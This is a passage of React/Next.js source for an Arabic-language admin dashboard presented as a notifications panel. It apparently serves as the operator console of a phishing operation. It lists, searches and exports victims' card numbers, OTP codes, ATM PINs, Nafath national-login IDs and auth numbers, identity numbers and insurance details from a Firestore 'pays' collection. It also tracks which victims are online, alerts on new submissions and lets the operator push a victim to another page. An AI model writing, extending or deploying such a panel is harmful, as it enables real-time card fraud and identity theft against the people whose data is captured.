  const [playSounds, setPlaySounds] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [refreshInterval, setRefreshInterval] = useState("30")

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
        <SheetHeader>
          <SheetTitle className="flex items-center gap-2 text-xl">
            <Settings className="h-5 w-5" />
            إعدادات الإشعارات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-6">
          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                </div>
                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                </div>
                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-nafaz">إشعارات نفاذ</Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تحديث معلومات نفاذ</p>
                </div>
                <Switch id="notify-nafaz" checked={notifyNafaz} onCheckedChange={setNotifyNafaz} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
                  <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
                </div>
                <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
              </div>
            </div>
          </div>
          <Separator />
          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
                </div>
                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5">
                  <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر فترة التحديث" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                      <SelectItem value="300">5 دقائق</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>
          <div className="flex justify-end gap-2 pt-4">
            <Button variant="outline" onClick={() => onOpenChange(false)}>
              إلغاء
            </Button>
            <Button
              onClick={() => {
                toast({
                  title: "تم حفظ الإعدادات",
                  description: "تم حفظ إعدادات الإشعارات بنجاح",
                })
                onOpenChange(false)
              }}
            >
              حفظ الإعدادات
            </Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  )
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "nafaz" | "insurance" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [nafazSubmissions, setNafazSubmissions] = useState<number>(0)
  const [insuranceSubmissions, setInsuranceSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "nafaz" | "insurance">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()
  const [pageUpdateDialogOpen, setPageUpdateDialogOpen] = useState(false)
  const [selectedNotificationForPageUpdate, setSelectedNotificationForPageUpdate] = useState<Notification | null>(null)
  const [newPageNumber, setNewPageNumber] = useState("")

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}
    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)
      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })
      statusRefs[notification.id] = callback
    })

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Statistics calculations
  const totalVisitorsCount = notifications.length
  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length
  const nafazSubmissionsCount = notifications.filter(
    (n) => n.nafazInfo && (n.nafazInfo.nafazId || n.nafazInfo.authNumber),
  ).length
  const insuranceSubmissionsCount = notifications.filter(
    (n) => n.insuranceData && Object.keys(n.insuranceData).length > 0,
  ).length
  const approvedCount = notifications.filter((n) => n.status === "approved").length
  const pendingCount = notifications.filter((n) => n.status === "pending").length

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    // Apply filter type
    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    } else if (filterType === "nafaz") {
      filtered = filtered.filter(
        (notification) =>
          notification.nafazInfo && (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber),
      )
    } else if (filterType === "insurance") {
      filtered = filtered.filter(
        (notification) => notification.insuranceData && Object.keys(notification.insuranceData).length > 0,
      )
    }

    // Apply search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification.name?.toLowerCase().includes(term) ||
          notification.email?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term) ||
          notification.atmPin?.toLowerCase().includes(term) ||
          notification.nafazInfo?.nafazId?.toLowerCase().includes(term) ||
          notification.nafazInfo?.authNumber?.toLowerCase().includes(term) ||
          notification.insuranceData?.documment_owner_full_name?.toLowerCase().includes(term) ||
          notification.insuranceData?.owner_identity_number?.toLowerCase().includes(term) ||
          notification.insuranceData?.sequenceNumber?.toLowerCase().includes(term) ||
          notification.insuranceData?.selectedInsuranceOffer?.toLowerCase().includes(term),
      )
    }

    // Apply sorting
    filtered.sort((a, b) => {
      let aValue: any, bValue: any

      switch (sortBy) {
        case "date":
          aValue = new Date(a.createdDate)
          bValue = new Date(b.createdDate)
          break
        case "status":
          aValue = a.status
          bValue = b.status
          break
        case "country":
          aValue = a.country || ""
          bValue = b.country || ""
          break
        default:
          return 0
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1
      } else {
        return aValue < bValue ? 1 : -1
      }
    })

    return filtered
  }, [filterType, notifications, onlineStatuses, searchTerm, sortBy, sortOrder])

  // Paginate notifications
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  // Reset to first page when filter or search changes
  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm])

  // Firebase authentication and data fetching
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))

    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info, general info, or nafaz info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )

        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
        )

        const hasNewNafazInfo = notificationsData.some(
          (notification) =>
            notification.nafazInfo &&
            (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber) &&
            !notifications.some(
              (n) => n.id === notification.id && n.nafazInfo && (n.nafazInfo.nafazId || n.nafazInfo.authNumber),
            ),
        )

        const hasNewInsuranceInfo = notificationsData.some(
          (notification) =>
            notification.insuranceData &&
            Object.keys(notification.insuranceData).length > 0 &&
            !notifications.some(
              (n) => n.id === notification.id && n.insuranceData && Object.keys(n.insuranceData).length > 0,
            ),
        )

        // Only play notification sound if new info is added
        if (hasNewCardInfo || hasNewGeneralInfo || hasNewNafazInfo || hasNewInsuranceInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)
        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        })
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length
    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
    // Nafaz submissions is the count of notifications with nafaz info
    const nafazCount = notificationsData.filter(
      (notification) => notification.nafazInfo && (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber),
    ).length
    // Insurance submissions is the count of notifications with insurance info
    const insuranceCount = notificationsData.filter(
      (notification) => notification.insuranceData && Object.keys(notification.insuranceData).length > 0,
    ).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
    setNafazSubmissions(nafazCount)
    setInsuranceSubmissions(insuranceCount)
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "nafaz" | "insurance") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const handleFlagColorChange = async (id: string, color: string) => {
    try {
      // Update in Firestore
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      toast({
        title: "تم تحديث العلامة",
        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      })
    }
  }

  const handleNafazUpdate = async (id: string, nafazInfo: NafazInfo) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { nafazInfo })

      // Update local state
      setNotifications(
        notifications.map((notification) => (notification.id === id ? { ...notification, nafazInfo } : notification)),
      )

      toast({
        title: "تم تحديث معلومات نفاذ",
        description: "تم تحديث معلومات نفاذ بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating nafaz info:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
        variant: "destructive",
      })
    }
  }

  const handleInsuranceUpdate = async (id: string, insuranceData: any) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { insuranceData })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, insuranceData } : notification,
        ),
      )

      toast({
        title: "تم تحديث معلومات التأمين",
        description: "تم تحديث معلومات التأمين بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating insurance info:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث معلومات التأمين",
        variant: "destructive",
      })
    }
  }

  const handlePageUpdate = async (id: string, newPage: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { currentPage: newPage })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, currentPage: newPage } : notification,
        ),
      )

      toast({
        title: "تم تحديث الصفحة",
        description: `تم تحديث الصفحة إلى ${newPage} بنجاح`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating page:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الصفحة",
        variant: "destructive",
      })
    }
  }

  const openPageUpdateDialog = (notification: Notification) => {
    setSelectedNotificationForPageUpdate(notification)
    setNewPageNumber(notification.currentPage || "1")
    setPageUpdateDialogOpen(true)
  }

  const handlePageUpdateSubmit = () => {
    if (selectedNotificationForPageUpdate && newPageNumber) {
      handlePageUpdate(selectedNotificationForPageUpdate.id, newPageNumber)
      setPageUpdateDialogOpen(false)
      setSelectedNotificationForPageUpdate(null)
      setNewPageNumber("")
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })

      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })

      await batch.commit()
      setNotifications([])
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handleSearch = (term: string) => {
    setSearchTerm(term)
  }

  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  const handleRefresh = () => {
    setIsLoading(true)
    fetchNotifications()
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
          </div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  // Sample data for mini charts (you can replace with real trend data)
  const visitorTrend = [5, 8, 12, 7, 10, 15, 13]
  const cardTrend = [2, 3, 5, 4, 6, 8, 7]
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6]
  const nafazTrend = [1, 2, 3, 2, 4, 5, 4]

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="flex items-center gap-2">
              <Bell className="h-5 w-5 text-primary" />
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-6">
            <div className="flex items-center gap-4">
              <Avatar>
                <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                <AvatarFallback>M</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-medium">مدير النظام</p>
                <p className="text-sm text-muted-foreground">admin@example.com</p>
              </div>
            </div>
            <Separator />
            <nav className="space-y-2">
              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
                <Bell className="mr-2 h-4 w-4" />
                الإشعارات
              </Button>
              <Button variant="ghost" className="w-full justify-start" onClick={() => setSettingsOpen(true)}>
                <Settings className="mr-2 h-4 w-4" />
                الإعدادات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => {
                  setExportDialogOpen(true)
                  setMobileMenuOpen(false)
                }}
              >
                <Download className="mr-2 h-4 w-4" />
                تصدير البيانات
              </Button>
              <Button variant="ghost" className="w-full justify-start text-red-500" onClick={handleLogout}>
                <LogOut className="mr-2 h-4 w-4" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      {/* Settings panel */}
      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />

      {/* Export dialog */}
      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />

      {/* Page Update Dialog */}
      <PageUpdateDialog
        open={pageUpdateDialogOpen}
        onOpenChange={setPageUpdateDialogOpen}
        notification={selectedNotificationForPageUpdate}
        onUpdate={handlePageUpdateSubmit}
      />

      {/* Enhanced Header */}
      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60">
        <div className="flex items-center justify-between p-4">
          <div className="flex items-center gap-4">
            <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
              <Menu className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <div className="relative">
                <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
                  <Bell className="h-6 w-6 text-white" />
                </div>
                {pendingCount > 0 && (
                  <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse">
                    {pendingCount}
                  </div>
                )}
              </div>
              <div>
                <h1 className="text-xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
                  لوحة الإشعارات المتقدمة مع نفاذ
                </h1>
                <p className="text-sm text-muted-foreground">
                  آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={handleRefresh}
                    className="relative overflow-hidden bg-transparent"
                  >
                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تحديث البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <div className="hidden md:flex items-center gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="outline" size="icon" onClick={() => setSettingsOpen(true)}>
                      <Settings className="h-4 w-4" />
                      <span className="sr-only">الإعدادات</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>الإعدادات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="outline" size="icon" onClick={() => setExportDialogOpen(true)}>
                      <Download className="h-4 w-4" />
                      <span className="sr-only">تصدير</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تصدير البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <Button
                variant="destructive"
                onClick={handleClearAll}
                disabled={notifications.length === 0}
                className="hidden sm:flex items-center gap-2"
              >
                <Trash2 className="h-4 w-4" />
                مسح الكل
              </Button>
            </div>

            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="ghost" className="relative h-10 w-10 rounded-full">
                  <Avatar className="h-10 w-10 ring-2 ring-primary/20">
                    <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                    <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">
                      مد
                    </AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56">
                <DropdownMenuLabel>
                  <div className="flex flex-col space-y-1">
                    <p className="text-sm font-medium">مدير النظام</p>
                    <p className="text-xs text-muted-foreground">admin@example.com</p>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
                  <Settings className="ml-2 h-4 w-4" />
                  الإعدادات
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
                  <Download className="ml-2 h-4 w-4" />
                  تصدير البيانات
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={handleLogout} className="text-red-600">
                  <LogOut className="ml-2 h-4 w-4" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <div className="p-6">
        {/* Enhanced Statistics Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          <StatisticsCard
            title="إجمالي الزوار"
            value={totalVisitorsCount}
            change="+12%"
            changeType="increase"
            icon={Users}
            color="bg-gradient-to-br from-blue-500 to-blue-600"
            trend={visitorTrend}
          />

          <StatisticsCard
            title="المستخدمين المتصلين"
            value={onlineUsersCount}
            change="+5%"
            changeType="increase"
            icon={UserCheck}
            color="bg-gradient-to-br from-green-500 to-green-600"
            trend={onlineTrend}
          />

          <StatisticsCard
            title="معلومات البطاقات"
            value={cardSubmissionsCount}
            change="+8%"
            changeType="increase"
            icon={CreditCard}
            color="bg-gradient-to-br from-purple-500 to-purple-600"
            trend={cardTrend}
          />

          <StatisticsCard
            title="معلومات نفاذ"
            value={nafazSubmissionsCount}
            change="+20%"
            changeType="increase"
            icon={Shield}
            color="bg-gradient-to-br from-orange-500 to-orange-600"
            trend={nafazTrend}
          />

          <StatisticsCard
            title="طلبات التأمين"
            value={insuranceSubmissionsCount}
            change="+15%"
            changeType="increase"
            icon={CreditCard}
            color="bg-gradient-to-br from-purple-500 to-purple-600"
            trend={[2, 4, 6, 5, 8, 10, 9]}
          />
        </div>

        {/* Enhanced Main Content */}
        <Card className="bg-card/50 backdrop-blur-sm border-0 shadow-xl">
          <CardHeader className="pb-4">
            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
              <div>
                <CardTitle className="text-2xl font-bold flex items-center gap-3">
                  <Activity className="h-6 w-6 text-primary" />
                  إدارة الإشعارات مع نفاذ
                </CardTitle>
                <CardDescription className="mt-1">
                  عرض وإدارة جميع الإشعارات والبيانات المستلمة بما في ذلك معلومات نفاذ
                </CardDescription>
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <SearchBar onSearch={handleSearch} />
                <div className="flex gap-2">
                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="outline" size="sm" className="gap-2 bg-transparent">
                        <Filter className="h-4 w-4" />
                        فلترة
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setFilterType("all")}>جميع الإشعارات</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("card")}>البطاقات فقط</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("nafaz")}>نفاذ فقط</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("online")}>المتصلين فقط</DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>

                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="outline" size="sm" className="gap-2 bg-transparent">
                        <ArrowUpDown className="h-4 w-4" />
                        ترتيب
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setSortBy("date")}>حسب التاريخ</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("status")}>حسب الحالة</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("country")}>حسب الدولة</DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>
                </div>
              </div>
            </div>

            {/* Filter Tabs */}
            <div className="flex flex-wrap gap-2 mt-4">
              <Button
                variant={filterType === "all" ? "default" : "outline"}
                onClick={() => setFilterType("all")}
                size="sm"
                className="gap-2"
              >
                الكل
                <Badge variant="secondary" className="bg-background text-foreground">
                  {notifications.length}
                </Badge>
              </Button>

              <Button
                variant={filterType === "card" ? "default" : "outline"}
                onClick={() => setFilterType("card")}
                size="sm"
                className="gap-2"
              >
                <CreditCard className="h-4 w-4" />
                البطاقات
                <Badge variant="secondary" className="bg-background text-foreground">
                  {cardSubmissionsCount}
                </Badge>
              </Button>

              <Button
                variant={filterType === "nafaz" ? "default" : "outline"}
                onClick={() => setFilterType("nafaz")}
                size="sm"
                className="gap-2"
              >
                <Shield className="h-4 w-4" />
                نفاذ
                <Badge variant="secondary" className="bg-background text-foreground">
                  {nafazSubmissionsCount}
                </Badge>
              </Button>

              <Button
                variant={filterType === "online" ? "default" : "outline"}
                onClick={() => setFilterType("online")}
                size="sm"
                className="gap-2"
              >
                <UserCheck className="h-4 w-4" />
                المتصلين
                <Badge variant="secondary" className="bg-background text-foreground">
                  {onlineUsersCount}
                </Badge>
              </Button>

              <Button
                variant={filterType === "insurance" ? "default" : "outline"}
                onClick={() => setFilterType("insurance")}
                size="sm"
                className="gap-2"
              >
                <CreditCard className="h-4 w-4" />
                التأمين
                <Badge variant="secondary" className="bg-background text-foreground">
                  {insuranceSubmissionsCount}
                </Badge>
              </Button>
            </div>
          </CardHeader>

          <CardContent className="p-0">
            {/* Desktop Table View */}
            <div className="hidden lg:block overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b bg-muted/30">
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الدولة</th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">المعلومات</th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الحالة</th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الوقت</th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الاتصال</th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الكود</th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الإجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {paginatedNotifications.map((notification, index) => (
                    <tr key={notification.id}>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                            <MapPin className="h-4 w-4 text-primary" />
                          </div>
                          <span className="font-medium">{notification.country || "غير معروف"}</span>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant={notification.phone ? "default" : "secondary"}
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                            }`}
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            <User className="h-3 w-3 mr-1" />
                            {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                          </Badge>

                          <Badge
                            variant={notification.cardNumber ? "default" : "secondary"}
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                            }`}
                            onClick={() => handleInfoClick(notification, "card")}
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                          </Badge>

                          <Badge
                            variant={
                              notification.nafazInfo &&
                              (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
                                ? "default"
                                : "secondary"
                            }
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.nafazInfo &&
                              (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
                                ? "bg-gradient-to-r from-orange-500 to-orange-600 text-white"
                                : ""
                            }`}
                            onClick={() => handleInfoClick(notification, "nafaz")}
                          >
                            <Shield className="h-3 w-3 mr-1" />
                            {notification.nafazInfo &&
